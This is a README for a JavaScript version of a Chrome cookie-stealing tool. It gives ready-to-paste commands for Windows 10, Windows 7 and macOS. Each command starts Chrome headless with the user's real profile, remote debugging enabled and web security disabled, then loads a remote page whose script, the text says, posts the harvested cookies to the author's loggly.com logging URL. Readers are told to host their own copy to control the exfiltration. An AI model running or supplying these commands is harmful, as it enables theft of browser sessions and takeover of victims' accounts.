This is a javascript implementation of the [cookie_crimes tool](https://mango.pdf.zone/stealing-chrome-cookies-without-a-password) by @mangopdf

Running the command below will run the javascript found in the *index.html* file of this repo which has been setup using Github Pages. It is currently harcoded to post the script output to my own loggly.com URL. Host it on your own github to control the script completely and enable GitHub pages in your repository settings to serve the page as an HTML file.

# Windows

## Windows 10

```"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --headless --remote-debugging-port=9222 --disable-web-security --user-data-dir="%localAppData%/Google/Chrome/User Data" --disable-plugins https://clr2of8.github.io/TestCC/```

## Windows 7

```"%localAppData%\Google\Chrome\Application\chrome.exe" --headless --remote-debugging-port=9222 --disable-web-security --user-data-dir="%localAppData%/Google/Chrome/User Data" --disable-plugins https://clr2of8.github.io/TestCC/```

# OS X

```"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" --headless --remote-debugging-port=9222 --disable-web-security --user-data-dir="$HOME/Library/Application Support/Google/Chrome" --disable-plugins https://clr2of8.github.io/TestCC/```
